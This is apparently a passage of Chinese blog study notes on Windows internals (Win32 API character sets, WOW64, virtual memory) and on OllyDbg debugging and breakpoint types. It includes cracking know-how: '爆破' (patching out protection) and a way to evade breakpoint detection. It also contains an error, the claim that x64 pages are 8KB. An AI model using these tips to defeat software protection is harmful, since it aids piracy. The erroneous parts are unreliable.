<div class="note warning"><p> 在早期， Windows的主要部分只需要在3个动态链接库中实现，它们分别代表Windows的3个主要子系统，叫作Kernel、User和GDI。</p>
<ol>
<li><strong>Kernel</strong>（由KERNEL32.DLL实现）：操作系统核心功能服务，包括进程与线程控制、内存管理、文件访问等。</li>
<li><strong>User</strong>（由USER32.DLL实现）：负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等。</li>
<li><strong>GDI</strong> （由GDI32.DLL实现）：图形设备接口，允许程序在屏幕和打印机上显示文本和图形。</li>
</ol>
</div>



<mark class="label primary">MessageBoxA</mark><mark class="label warning">MessageBoxW</mark>

<p>在Win32 API 函数字符集中，<mark class="label primary">A</mark>表示ANSI（ASCII的扩展，8bit编码）， <mark class="label warning">W</mark>表示Widechars（即Unicode）。前者就是通常使用的单字节方式，后者是宽字节方式，以便处理双字节字符。每个以字符串为参数的Win32函数在操作系统中都有这两种方式的版本。</p>
<p>例如，在编程时使用MessageBox函数，而在USER32.DLL 中却没有32位MessageBox函数的入口。实际上有两个入口，一个名为<code>MessageBoxA</code>（ANSI版）， 另一个名为<code>MessageBoxW</code>（宽字符版）。幸运的是，程序员通常不必关心这个问题，只需要在编程时使用MessageBox 函数，开发工具的编译模块就会根据设置来决定是采用MessageBoxA 还是 MessageBoxW了。<strong>但是在使用OD调试的时候得区分开。</strong></p>
<div class="note info"><p>NT系统是使用 Unicode 标准字符集重新开发的，其系统核心完全是用Unieode函数工作的。如果希望调用一个 Windows函数并向它传递一个 ANSI字符串，系统会先将ANSI字符串转换成Unicode字符串，再将Unicode字符串传递给操作系统。相反，如果希望函数返回ANSI字符串，系统会先将Unicode字符串转换成ANSI 字符串，然后将结果返回应用程序。也就是说，在NT架构下，Win32 API能接受Unicode和ASCII两种字符集，而其<mark class="label info">内核只能使用Unicode字符集</mark>。尽管这些操作对用户来说都是透明的，但字符串的转换需要占用系统资源。</p>
</div>

<h3 id="2-2-WOW64"><a href="#2-2-WOW64" class="headerlink" title="2.2 WOW64"></a>2.2 WOW64</h3><p>WOW64（Windows-on-Windows 64-bit）是64位Windows操作系统的子系统，可以使大多数32位应用程序在不进行修改的情况下运行在64位操作系统上。</p>
<p><strong>64位的Windows，除了带有64位操作系统应有的系统文件，还带有32位操作系统应有的系统文件。</strong></p>
<ul>
<li><p>Windows的64位系统文件都放在一个叫作<code>System32</code>的文件夹中，<code>\Windows\System32</code>文件夹中包含原生的64位映像文件。为了兼容32位操作系统，还增加了<code>\Windows\SysWOW64</code>文件夹，其中存储了32位的系统文件。</p>
</li>
<li><p>64位应用程序会加载<code>System32</code>目录下64位的<code>kernel32.dll</code>、<code>user32.dll</code>和<code>ntdll.dll</code>。</p>
</li>
<li><p>当32位应用程序加载时，<mark class="label success">WOW64</mark><mark class="label danger">建立32位ntdll.dll所要求的启动环境，将CPU模式切换至32位，并开始执行32位加载器</mark>，就如同该进程运行在原生的32位系统上一样。 </p>
</li>
<li><p>WOW64会对32位<code>ntdll.dll</code>的调用重定向<code>ntdll.dll</code>（64位），而不是发出原生的32位系统调用指令。WOW64转换到原生的64位模式，捕获与系统调用有关的参数，发出对应的原生64位系统调用。当原生的系统调用返回时，WOW64在返回32位模式之前将所有输出参数从64位转换成32位。</p>
</li>
<li><p>WOW64既不支持16位应用程序的执行（32位Windows支持16 位应用程序的执行），也不支持加载32位内核模式的设备驱动程序。<strong>WOW64进程只能加载32位的DLL，不能加载原生的64位DLL</strong>。类似的，<strong>原生的64位进程不能加载32位的DLL</strong>。</p>
</li>
</ul>
<h3 id="2-3-虚拟内存"><a href="#2-3-虚拟内存" class="headerlink" title="2.3 虚拟内存"></a>2.3 虚拟内存</h3><p>CPU的运行模式：实模式、保护模式、虚拟8086模式。<a href="https://blog.csdn.net/laviolette/article/details/51658650">实模式和保护模式</a></p>
<p>X86机器主要使用实模式和保护模式：</p>
<ul>
<li><p>实模式：<strong>16位的操作系统，应用程序直接使用物理内存，无虚拟内存的概念</strong>。内存并没有分段，段的划分来自于CPU，由于8086CPU用$段地址*16+偏移地址&#x3D;物理地址$的方式给出内存单元的物理地址，使得我们可以用分段的方式来管理内存物理地址，寻址使用段寄存器：</p>
<ul>
<li><p>CS：代码段寄存器；</p>
</li>
<li><p>DS：数据段寄存器；</p>
</li>
<li><p>SS：堆栈段寄存器；</p>
</li>
<li><p>ES：扩展段寄存器；</p>
</li>
<li><p>IP：指令指针寄存器。</p>
<p>当CPU要访问内存时，有这四个段寄存器提供内存单元的段地址CS和IP是CPU中最关键的寄存器，他们指示了CPU当前要读取指令的地址。在任何时候 CPU将CS、IP中的内容当做指令的段地址和偏移地址，用他们合成指令的物理地址到内存中读取指令码。$物理地址&#x3D;CS*16+IP$</p>
</li>
</ul>
</li>
<li><p>保护模式：32位系统开始采用的模式，<strong>使用虚拟内存技术</strong>，给每个运行的程序分配逻辑上的4GB虚拟内存（32位和64位进程），使应用程序不直接操作物理内存、各应用程序独立运行互不影响、提高物理内存的使用效率，<strong>CPU使用段页式内存管理</strong>。</p>
</li>
</ul>
<p><strong>虚拟内存：</strong></p>
<ol>
<li>当一个 PE 文件被执行时，操作系统会先为该程序创建一个 4GB 的进程虚拟地址空间，当创建完虚拟地址空间所需要的数据结构后，进程开始读取 PE 文件的第一页。在PE 文件的第一页包含了 PE 文件头和段表等信息，进程根据文件头和段表等信息，将 PE 文件中所有的段一一映射到虚拟地址空间中相应的页（PE 文件中的段的长度都是页长的整数倍）。这时 PE 文件的真正指令和数据还没有被装入内存中，操作系统只是据 PE 文件的头部等信息建立了 PE 文件和进程虚拟地址空间中页的映射关系而已。</li>
<li>当 CPU 要访问程序中用到的某个虚拟地址时，当 CPU 发现该地址并没有相关联的物理地址时， CPU 认为该虚拟地址所在的页面是个空页面， CPU 会认为这是个<mark class="label danger">页错误</mark>（Page Fault）， CPU 也就知道了操作系统还未给该 PE 页面分配内存，CPU 会将控制权交还给操作系统。</li>
<li>操作系统于是为该 PE 页面在物理空间中分配一个页面，然后再将这个物理页面与虚拟空间中的虚拟页面映射起来，然后将控制权再还给进程，进程从刚才发生页错误的位置重新开始执行。由于此时已为 PE 文件的那个页面分配了内存，所以就不会发生页错误了。随着程序的执行，页错误会不断地产生，操作系统也会为进程分配相应的物理页面来满足进程执行的需求。</li>
</ol>
<p>1）程序执行时，PE文件与虚拟地址映射过程如下图（<a href="https://www.cnblogs.com/kekec/p/7350993.html">Windows虚拟内存机制</a>）：</p>
<p><img data-src="https://i.loli.net/2021/07/06/Bogt2S61q4GYvy7.png" alt="6.png"></p>
<p>2）虚拟地址与物理地址的映射如下图（<a href="https://blog.csdn.net/qq_41723615/article/details/102541030">物理地址、虚拟地址、虚拟内存、分段、分页以及Windows&#x2F;Linux内存管理</a>）：</p>
<p><img data-src="https://i.loli.net/2021/07/06/XzfhqEZmsOAB92K.png" alt="7.png"></p>
<p>3）当CPU访问数据时将已经从虚拟地址与物理地址映射好的数据装进物理内存过程如下图（<a href="https://blog.csdn.net/lwwl12/article/details/88859044">Windows API（四）Win32 内存结构</a>）：</p>
<p><img data-src="https://i.loli.net/2021/07/07/d9W5s8ISJLMUGCj.png" alt="8.png"></p>
<div class="note info"><p><strong>段的定义</strong>：把程序与其相关的数据划分到几个段中，比如数据段、代码段和堆栈段。段的长度有限制，但是不要求所有程序的所有段长度都一样。</p>
<p>现代操作系统使用<mark class="label primary">段页式内存管理</mark>，在段页式系统中，程序的地址空间首先被分成若干个逻辑段（.data、.text、.bss、栈、堆等），每段都有自己的段号，然后再将每一段分成若干个大小固定的页。对内存空间的管理仍然和分页存储管理一样，将其分成若干个和页面大小相同的存储块，对内存的分配以存储块为单位。</p>
<p>段，是从编程的角度来看的，比如PE文件的各个分段就是一种划分，每个段的属性可以不同。段的使用方法先于分页，然后到现在使用的段页式内存管理方式。</p>
<p><mark class="label warning">程序（PE文件）载入虚拟内存使用分段方式，MMU将虚拟内存转换为物理内存使用分页方式。PE文件中也是进行分段处理。</mark></p>
<ul>
<li><strong>分段机制</strong>：实现虚拟地址（由段和偏移构成的逻辑地址）到线性地址（<code>0xXXXX XXXX</code>）的转换。</li>
<li><strong>分页机制</strong>：分页管理机制实现线性地址到物理地址的转换。</li>
</ul>
<p><strong>先分段 , 再分页</strong></p>
<p>将进程按逻辑模块分段，再将各段分页（如每个页面 4KB) 再将内存空间分为大小相同的内存块&#x2F;页框&#x2F;页帧&#x2F;物理块进程前将各页面分别装入各内存块中。</p>
</div>

<p>实现线性地址到物理地址的转换这个对应是由MMU硬件实现的，不用程序员操心！而且分页和分段对于虚拟地址的映射方式基本一致，<strong>分段是通过段表GDT，LDT中的段描述符来确定段的属性和物理地址范围；而分页是通过页表项（页表描述符）来记录页框的属性和物理地址位置！</strong></p>
<p>在段页式存储管理系统中，作业的地址空间首先被分成若干个逻辑分段，每段都有自己的段号，然后再将每段分成若干个大小相等的页。对于主存空间也分成大小相等的页，主存的分配以页为单位。</p>
<ul>
<li><a href="https://blog.csdn.net/lianghe_work/article/details/47776447">浅谈进程地址空间与虚拟存储空间</a></li>
<li><a href="https://blog.csdn.net/qq_41723615/article/details/102541030">物理地址、虚拟地址、虚拟内存、分段、分页以及Windows&#x2F;Linux内存管理</a></li>
</ul>
<p>分段和分页的区别：</p>
<ol>
<li>在分段的方法中，<strong>每次程序运行时总是把程序全部装入内存</strong>，而分页的方法则有所不同。分页的思想是程序运行时用到哪页就为哪页分配内存，没用到的页暂时保留在硬盘上。当用到这些页时再在物理地址空间中为这些页分配内存，然后建立虚拟地址空间中的页和刚分配的物理内存页间的映射。</li>
<li>分页仅仅是由于系统管理的需要而不是用户的需要。段则是信息的逻辑单位，它含有一组其意义相对完整的信息。分段的目的是为了能更好地满足用户的需要。</li>
<li>页的大小固定且由系统决定，由系统把逻辑地址划分为页号和页内地址两部分，是由机器硬件实现的，因而在系统中只能有一种大小的页面；而段的长度却不固定，决定于用户所编写的程序，通常由编译程序在对源程序进行编译时，根据信息的性质来划分。</li>
<li>分页的作业地址空间是一维的，即单一的线性地址空间，程序员只需利用一个记忆符，即可表示一个地址；而分段的作业地址空间则是二维的，程序员在标识一个地址时，既需给出段名，又需给出段内地址。</li>
<li>在段式存储管理中，将程序的地址空间划分为若干段（segment），如代码段，数据段，堆栈段；这样每个进程有一个二维地址空间，相互独立，互不干扰。段式管理的优点是：没有内碎片（因为段大小可变，改变段大小来消除内碎片）。但段换入换出时，会产生外碎片（比如4k的段换5k的段，会产生1k的外碎片）。</li>
</ol>
<ul>
<li>【<a href="https://blog.csdn.net/bupt_tinyfisher/article/details/8939689">分段和分页内存管理</a>】</li>
</ul>
<div class="note success"><p><strong>磁盘一个物理扇区的大小为512字节， 即200h（字节），PE文件的区块在磁盘中以这个粒度为大小进行对齐。</strong></p>
<ul>
<li>在x86系列CPU中，内存页是按4KB （<code>1000h</code>）排列的,所以，在x86系统中（虚拟内存），PE文件区块的内存对齐值般为<code>1000h</code>，每个区块从<code>1000h</code>的倍数的内存偏移位置开始。（4(KB)*1024&#x3D;4096 Byte&#x3D;1000h Byte）</li>
<li>在x64中， 内存页是按8KB（<code>2000h</code>）排列的。</li>
</ul>
</div>



<p>32位处理器将分配给每个应用程秀的虚拟地址空间做如下划分，一般给用户模式划分2GB虚拟内存，也可扩大3GB。无论是32位还是64位windows若要让32位程序能使用3GB内存，必须在链接时加上参数：<a href="https://blog.csdn.net/lff0305/article/details/7613741"><code> /LARGEADDRESSAWARE</code></a>、<a href="https://blog.csdn.net/u011430225/article/details/88950730?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">32位Exe程序突破系统内存限制</a></p>
<p>在早期版本的Windows中，Microsoft不允许用户程序访问2GB以上的地址空间，为了让此类应用程序即使在用模式分区大于2GB的环境下仍能正常运行，Microsoft提供代了一种模式来增大用户模式分区，最多不超过3GB。 当前系统即将运行一个应用程序时，它会检查应用程序在链接时是否使用了<code>/LARGEADDRESSAWARE</code>链接器开关。如果是，则相应于应用程序在声明它会充分利用大用户模式地址空间，而不会对内在地址进行任何不当的操作。反之，如果应用程序在链接时没有使用<code>/LARGEADDRESSAWARE</code>开关，那么操作系统会保留用户模式分区中2GB以上到内核模式开始处的整个部分。</p>
<p>本文以默认情况2GB用户模式为例。</p>
<p><img data-src="https://i.loli.net/2021/07/05/uBxb4zF1cJ6Dryj.png" alt="5.png"></p>
<div class="note default"><ol>
<li><strong>64KB NULL指针区</strong> （<code>0x00000000~0x0000FFFF</code>）: 如果进程中的一个线程试图操作这个分区中的数据，CPU就会引发非法访问。他的作用是，调用<code>malloc</code>等内存分配函数时，如果无法找到足够的内存空间，它将返回<code>NULL</code>。而不进行安全性检查。它只是假设地址分配成功，并开始访问内存地址<code>0x00000000</code>（NULL）。由于禁止访问内存的这个分区，因此会发生非法访问现象，并终止这个进程的运行。没有任何办法可以让我们分配到位于这一地址空间的虚拟内存，即使是使用Win32 API也不例外。</li>
<li><strong>用户模式分区</strong> ( <code>0x00010000~0xBFFEFFFF</code>)：这个分区中存放进程的私有地址空间，DLL被装入这一分区，内存映射文件映射到该分区。一个进程无法以任何方式访问另外一个进程驻留在这个分区中的数据 （相同 exe，通过 copy-on-write 来完成地址隔离）。（在Windows中，<mark class="label warning">所有 .exe 和动态链接库都载入到这一区域</mark>。<strong>系统同时会把该进程可以访问的所有内存映射文件（系统DLL）映射到这一分区</strong>，对所有应用程序来说，进程的大部分数据都保存在这一分区。）。</li>
<li><strong>64KB 禁入区</strong> (<code>0xBFFF0000~0xBFFFFFFF</code>)：这个分区禁止进入，禁止访问分区只有在Win2000中有。这个分区是用户分区和内核分区之间的一个隔离带，目的是为了防止用户程序违规访问内核分区。任何试图访问这个内存分区的操作都是违规的。微软保留这块分区的目的是为了简化操作系统的现实。</li>
<li><strong>内核区</strong> (0xC0000000~0xFFFFFFFF)：装入Windows NT执行体、内核和设备驱动。这个分区存放操作系统驻留的代码、内核对象也驻留在此。线程调度、内存管理、文件系统支持、网络支持和所有设备驱动程序代码都在这个分区加载。内核分区对用户的程序来说是禁止访问的，操作系统的代码在此。内核对象也驻留在此。<mark class="label warning">这个分区被所有进程共享</mark>。</li>
</ol>
</div>

<p>给每个应用程序分配4GB虚拟内存（如上图），但是只有用户模式的2&#x2F;3GB可以被应用程序直接使用，各个应用程序的用户区都是隔离的，逻辑上的，虚拟的。但是内核区的1&#x2F;2GB，内核区保存的是系统线程调度、内存管理、设备驱动等数据，这部分数据供<strong>所有的进程</strong>共享，但应用程序是不能直接访问的。</p>
<div class="note primary"><p>Windows系统在进程空间中专门划出一块<code>0x7000 0000 - 0x8000 0000</code>（共256MB）区域，用于映射这些常用的系统DLL(如kernel32.dll、ntdll.dll等)</p>
</div>

<p>2GB用户模式分区：</p>
<p><img data-src="https://i.loli.net/2021/07/09/lrAfWe6vSmM7wRz.png" alt="10.png"></p>
<p>参考：</p>
<ul>
<li><p>32位：【<a href="https://blog.csdn.net/muyangjun/article/details/83795640">Windows 内存机制说明</a>】、【<a href="https://www.cnblogs.com/kekec/p/7350993.html">windows虚拟内存机制</a>】、【<a href="https://blog.csdn.net/lianghe_work/article/details/47776447">浅谈进程地址空间与虚拟存储空间</a>】、【<a href="https://blog.csdn.net/zhanxiao5287/article/details/83902332">内存、虚拟内存的布局</a>】</p>
</li>
<li><p>64位：【<a href="https://www.cnblogs.com/xuanyuan/p/5260871.html">64 位 Windows 内核虚拟地址空间布局（基于 X64 CPU）</a>】</p>
</li>
<li><p>Win98和Win2000虚拟内存分区的区别：【<a href="https://www.cnblogs.com/gd-luojialin/p/7591274.html">进程的虚拟地址空间</a>】</p>
</li>
<li><p>Linux：【<a href="https://blog.csdn.net/Arlingtonroad/article/details/107148527?ops_request_misc=&request_id=&biz_id=102&utm_term=%E8%BF%9B%E7%A8%8B%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%88%86%E5%B8%83%E5%92%8C%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%86%E5%B8%83&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-.nonecase&spm=1018.2226.3001.4187">进程虚拟地址空间的分布详解</a>】、<a href="https://www.cnblogs.com/zszmhd/archive/2012/08/29/2661461.html">Linux内存寻址和内存管理</a>、【《CS：APP》】、【<a href="https://cloud.tencent.com/developer/article/1624718">Linux可执行文件与进程的虚拟地址空间</a>】</p>
</li>
</ul>
<div class="note danger"><p>程序使用的虚拟地址：</p>
<p>①当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配 2GB 的虚拟地址（不是内存，只是地址）；</p>
<p>②虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入物理地址（注意：虚拟地址与应用程序代码在物理内存中的位置是没有关系的）。</p>
<p>③如果使用 DLL，DLL 也会被映射到进程的虚拟地址空间中，在需要的时候才会被读入物理内存。</p>
<p>④其他项目（数据、堆等）的空间是从物理内存中分配的，并被映射到虚拟地址空间中。</p>
<p>⑤应用程序通过使用其虚拟地址空间中的地址开始执行。然后，虚拟内存管理器把每次内存访问映射到物理位置。</p>
</div>

<p>总结为以下几点：</p>
<ol>
<li>应用程序不会直接访问物理地址。</li>
<li>虚拟内存管理器通过虚拟地址的访问请求来控制所有的物理地址访问。</li>
<li>每个应用程序都有独立的 4B 寻址空间，不同应用程序的地址空间是彼此隔离的。</li>
<li>DLL 程序没有“私有”空间，它们总是被映射到其他应用程序的地址空间中，作为其他应</li>
</ol>
<p>用程序的一部分运行。其原因是：如果 DLL 不与其他程序处于同一个地址空间，应用程序</p>
<p>64 位 Windows 操作系统提供了 <strong>16TB</strong> 的有效寻址空间，其中的一半可用于用户模式的应用程序。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>《加密与解密》_2_动态调试技术_OllyDbg</title>
    <url>/post/encryption-and-cracking-2-ollydbg/</url>
    <content><![CDATA[<p>⍢⃝  ⍤⃝ ⍥⃝ ⍨⃝ ⌓̈⃝ ◡̈⃝  ⠒̫⃝  ʚ◡̈⃝ɞ  ༛̥⃝ʺ̤ </p>
<span id="more"></span>

<h2 id="动态分析技术"><a href="#动态分析技术" class="headerlink" title="动态分析技术"></a>动态分析技术</h2><div class="note danger"><p>动态调试器：</p>
<ul>
<li><mark class="label default">用户模式</mark>：工作在Ring3。<ul>
<li>OllyDbg、x64dbg、MDebug、Visual C++等。</li>
</ul>
</li>
<li><mark class="label default">内核模式</mark>：工作在Ring0，操作系统内核调试器。<ul>
<li>WinDbg</li>
</ul>
</li>
</ul>
</div>

<h3 id="1-调试窗口"><a href="#1-调试窗口" class="headerlink" title="1 调试窗口"></a>1 调试窗口</h3><p>OllyDbg的5个窗口：</p>
<p><img data-src="https://i.loli.net/2021/07/26/qR17DOSweKpa9k5.png" alt="1.png"></p>
<p>详细可查看<a href="https://blog.csdn.net/qq_40591440/article/details/110090789">《OD窗口介绍》</a></p>
<ol>
<li><p><strong>反汇编窗口</strong>：</p>
<ul>
<li><strong>Address</strong> 列：显示被双击行地址的相对地址，再次双击返回标准地址模式（栈区也可双击地址）。虚拟地址，<mark class="label warning">在一般情况下，同一程序的同一条指令在不同系统环境下此值相同</mark>。</li>
<li><strong>Hex dump</strong> 列：设置或取消无条件断点，快捷键：<mark class="label success">F2</mark>键。</li>
<li><strong>Disassembly</strong> 列：调用汇编器，可直接修改汇编代码，快捷键：空格键。</li>
<li><strong>Comment</strong> 列：允许增加或编辑注释，快捷键：<mark class="label success">；</mark>键。</li>
</ul>
</li>
<li><p><strong>信息窗口</strong>：在进行动态跟踪时，信息面板窗口（Information window）将显示以下等信息：</p>
<ul>
<li>寄存器的值；</li>
<li>API 函数调用提示；</li>
<li>跳转提示。</li>
</ul>
</li>
<li><p><strong>数据窗口</strong>：以<strong>十六进制</strong>和<strong>字符方式</strong>显示<strong>文件在内存中的数据</strong>。可使用数据窗口跟随或在数据窗口按“<code>Ctl+G”</code>快捷键，打开地址窗口，输入地址。</p>
</li>
<li><p><strong>寄存器窗口</strong>：显示 CPU 各寄存器的值，支持浮点、MMX 和 3DNow!寄存器。可以单击右键或窗口标题切换显示寄存器的方式。修改寄存器的值可直接双击（EIP除外）。EIP寄存器，不能直接修改，需要在反汇编窗口选择新的指令起始地址，在弹出的快捷菜单中选择“New origin here”（此处为新的EIP）。</p>
</li>
<li><p><strong>栈面板窗口</strong>：显示栈的内容。栈窗口非常重要，各 API 函数和子程序都利用它传递参数和变量等。</p>
</li>
</ol>
<ul>
<li>OD所在目录下的UDD 文件是 Ollydbg 的工程文件，用于保存当前调试的一些状态，例如断点、注释等，以</li>
</ul>
<p>便下次调试时继续使用。</p>
<ul>
<li>插件用于扩充功能。路径设置正确后，将插件复制到<code>plugin</code>目录里，相应的选项就会在Ollydbg 的主菜单<code>Plugin</code>（插件）里显示出来。</li>
</ul>
<h3 id="2-基本操作"><a href="#2-基本操作" class="headerlink" title="2 基本操作"></a>2 基本操作</h3><p>大部分程序在启动时都会停在<mark class="label default">入口点</mark>（EntryPoint）。通过一些特殊的修改方式，有些程序可以在启动时不停在入口点，以达到反调试的目的。</p>
<p>快捷键：</p>
<p><img data-src="https://i.loli.net/2021/08/23/EtGb4fwe2kzgiRx.png" alt="2.png"></p>
<p>Call的跟进与回退查看：</p>
<ul>
<li>按<code>F7</code>进入子程序的过程后，若想回看之前单步跟踪的代码，可以按<mark class="label success">-</mark>（减号）键。（除了反汇编窗口中能会退看之前的代码外，其余窗口数据不会变化）；</li>
<li>若想让光标回到当前EIP所指向的语句，可以单击快捷窗口<strong>C</strong>按钮或双击EIP寄存器。</li>
</ul>
<mark class="label danger">OllyDbg对API的大小写敏感，输入的函数名大小写必须正确。</mark>



<p>通过屏蔽程序的某些功能或改变程序流程使程序保护方式失效的方法称为“爆破”。</p>
<p>代码分析：</p>
<ul>
<li>如<code>mov bl,[eax+405030]</code>：若eax每次自增<code>inc</code>或自减<code>dec</code>，则<code>0x405030</code>有很大可能是一个数组集合，构成两个循环自变量，<code>0x405030</code>为大循环自变量。</li>
<li>函数<code>wsprintf()</code>是唯一需要需要手动平衡栈的API函数。</li>
</ul>
<h3 id="3-常用断点"><a href="#3-常用断点" class="headerlink" title="3 常用断点"></a>3 常用断点</h3><p>常用的断点有：</p>
<ul>
<li><mark class="label default">INT3 断点</mark></li>
<li><mark class="label default">硬件断点</mark></li>
<li><mark class="label default">内存断点</mark></li>
<li><mark class="label default">消息断点 ...</mark></li>
</ul>
<h4 id="3-1-INT-3-断点"><a href="#3-1-INT-3-断点" class="headerlink" title="3.1 INT 3 断点"></a>3.1 INT 3 断点</h4><p>在Ollydbg中可以使用如下快捷键来设置&#x2F;取消断点：</p>
<ul>
<li><mark class="label warning">bp</mark></li>
<li><mark class="label warning">F2</mark></li>
</ul>
<p>原理：当执行一个 INT3 断点时，该地址处的<strong>机器码</strong>被调试器用 INT3 指令替换了，此时 Ollydbg 将 INT3 隐藏，显示出来的仍是中断前的指令。如在<code>004013A5h</code>处设置int3 断点，则该地址处的机器码被替换成<code>CC</code>，当<code>CC</code>执行完之后，再去执行该地址处的指令。</p>
<div class="note danger"><p>这个 INT 3 指令，因其机器码是<code>0xCC</code>，也常被称为<mark class="label danger">CC 指令</mark>，故一般缓冲区经常填充为<strong>C</strong>。</p>
</div>



<div class="note primary"><p>使用上的一些技巧：</p>
<p>一些软件会对自身较为敏感的API函数进行检测，为了防范 API 被下断，一些软件会检测 API 的<strong>首地址</strong>是否为<code>0xCC</code>（以此判断是否被下断）。</p>
<p>技巧：躲过检测的方法是将断点设在函数<mark class="label danger">内部或末尾</mark>，例如将断点设在函数入口的下一行等。</p>
</div>



<h4 id="3-2-硬件断点"><a href="#3-2-硬件断点" class="headerlink" title="3.2 硬件断点"></a>3.2 硬件断点</h4><div class="note success"><p>硬件断点优势：</p>
<ol>
<li>INT 3 断点容易被检测到；</li>
<li>硬件断点执行速度快。</li>
</ol>
<p>缺点：最多只能使用 4 个断点。</p>
<p>硬件断点可以在代码区、数据区下断点。<strong>在数据区下断点也可以实现与内存断点相同的效果</strong>。</p>
</div>

<p>硬件断点和<mark class="label success">DRx</mark>调试寄存器有关。在 Intel CPU 体系架构手册中可以找到对 DRx 调试寄存器的介绍，如图 2.24 所示。</p>
<p><img data-src="https://i.loli.net/2021/08/19/dXzH9fIEmYJL7BP.png" alt="3.png"></p>
<p>DRx 调试寄存器共有 8 个（DRO~DR7），每个寄存器的特性如下。</p>
<ul>
<li>DR0~DR3：调试地址寄存器，用于保存需要监视的地址，例如设置硬件断点。</li>
<li>DR4~DR5：保留，未公开具体作用。</li>
<li>DR6：调试寄存器组<strong>状态</strong>寄存器。</li>
<li>DR7：调试寄存器组<strong>控制</strong>寄存器。</li>
</ul>
<p>硬件断点的原理是使用 DRO、DR1、DR2、DR3 <strong>设定地址</strong>，并使用 DR7 设定相应的控制位，因此<mark class="label success">最多设置 4 个断点</mark> 。硬件执行断点与<code>CC</code>断点的作用一样，但因为硬件执行断点不会将指令首字节修改为<code>CC</code>，所以更难检测。</p>
<div class="note success"><p><strong>硬件断点设断方法：</strong></p>
<ul>
<li>在指定的代码行单击右键，执行快捷菜单中的“Breakpoint” →”Hardware, on execution”（“断点”→“硬件执行”）命令。</li>
<li><mark class="label warning">HE</mark>地址。</li>
</ul>
<p><strong>硬件断点删除方法：</strong></p>
<ul>
<li>单击菜单栏“调试”→”硬件断点”；</li>
<li>在有硬件断点的地址处右键删除硬件断点。</li>
</ul>
</div>

<p>硬件断点的运用：Ollydbg 提供了一个快捷键<mark class="label warning">F4</mark>，可以执行到光标所在的行。这也是利用调试寄存器的原理 --- 在中断后自动删除，相当于执行了一次性硬件断点。</p>
<p>硬件断点的优点是速度快，在 INT 3 断点容易被发现的地方使用硬件断点会有很好的效果，缺点是最多只能使用 4 个断点。</p>
<h4 id="3-3-内存断点"><a href="#3-3-内存断点" class="headerlink" title="3.3 内存断点"></a>3.3 内存断点</h4><div class="note danger"><p>内存断点：只能下<mark class="label default">1</mark>个内存断点。</p>
<ul>
<li>内存访问断点；“断点”→“内存访问”&#x2F;“删除内存断点”）</li>
<li>内存写入断点。（“断点”→“内存写入”&#x2F;“删除内存断点”）</li>
</ul>
</div>

<div class="note warning"><p>内存断点与<code>INT 3</code>断点的区别：</p>
<p>内存断点<strong>不修改原始代码</strong>，不会像 INT3 断点那样因为修改代码被程序校验而导致下断失败。因此，<strong>在遇到代码校验且硬件断点失灵的情况下，可以使用内存断点</strong>。</p>
</div>

<p>Ollydbg可以设置内存访问断点或内存写断点。</p>
<p>原理：对所设的地址赋予<strong>不可访&#x2F;不可写</strong>属性，这样当访问&#x2F;写的时候就会产生异常。Ollydbg 截获异常后，比较异常地址是不是断点地址，如果是就中断，让用户继续操作。</p>
<p>程序运行时有 3 种状态，分别是读取、写入和执行（被CPU执行）。写入和读取的示例代码如下</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[<span class="number">405528</span>], edx   ;对【<span class="number">405528</span>] 处的内存进行写入</span><br><span class="line">mov edx, dword ptr ds:[<span class="number">405528</span>]   ;对【<span class="number">405528</span>] 处的内存进行读取</span><br></pre></td></tr></table></figure>

<p><strong>硬件断点与内存断点：</strong></p>
<p>硬件断点在<mark class="label info">数据区</mark>下断也可以实现与内存断点相同的效果。单个硬件写入访问断点可以设置为 1 字节、2 字节或 4 字节，而且不论选择的数据范围有多大，只有前 4 个字节会起作用。</p>
<div class="note danger"><p><mark class="label primary"><strong>硬件访问&#x2F;写入断点是在触发硬件断点的下一条指令处下断，而内存断点是在触发断点的指令处下断。</strong></mark></p>
</div>



<h4 id="3-4-内存访问一次性断点"><a href="#3-4-内存访问一次性断点" class="headerlink" title="3.4 内存访问一次性断点"></a>3.4 内存访问一次性断点</h4><p>该类型的断点是一次性的，它可以对内存块的整个段下断点。由于Windows使用段页式的内存管理方法，每个段都有不可访问、读、写、执行的属性，如果对某一个区块下断点之后，当这个区块被访问或者执行时就会中断。</p>
<p>简称为<mark class="label info">段断点</mark>，在脱壳时捕捉调用或返回某个模块很有用。</p>
<p>使用方法：</p>
<ul>
<li>在OD里按<code>Alt+M</code>&#x2F;快捷按钮<strong>M</strong>→在相应的段上单击右键→在访问上设置断点（Set break-on-access）</li>
</ul>
<div class="note default"><p>段断点与内存断点是有区别的，段断点（<mark class="label success">在访问上设置中断</mark>）是一次性的，而内存断点不是一次性的。</p>
</div>



<h4 id="3-5-消息断点"><a href="#3-5-消息断点" class="headerlink" title="3.5 消息断点"></a>3.5 消息断点</h4><p>Windows 本身是由消息驱动的，<strong>如果调试时没有合适的断点，可以尝试使用消息断点</strong>。当某个特定窗口函数接收到某个特定消息时，消息断点将使程序中断。</p>
<div class="note danger"><p>消息断点与 INT 3 断点的区别在于：INT 3 断点可以在程序启动之前设置，消息断点<strong>只有在窗口被创建之后</strong>才能被设置并拦截消息。</p>
</div>

<p>当用户单击一个按钮、移动光标或者向文本框中输入文字时（一个事件），一条消息就会发送给当前窗体。所有发送的消息都有 4 个参数，分别是 1 个窗口句柄（hwnd）、1 个消息编号（msg）和 2 个 32 位长（long）的参数。<mark class="label warning">Windows 通过句柄来标识它所代表的对象</mark>。例如，在单击某个按钮时，Windows 通过句柄来判断单击了哪一个按钮，然后发送相应的消息来通知程序。</p>
<p>事件→发送消息（4个参数）→当前窗体。</p>
<p>举例：</p>
<ol>
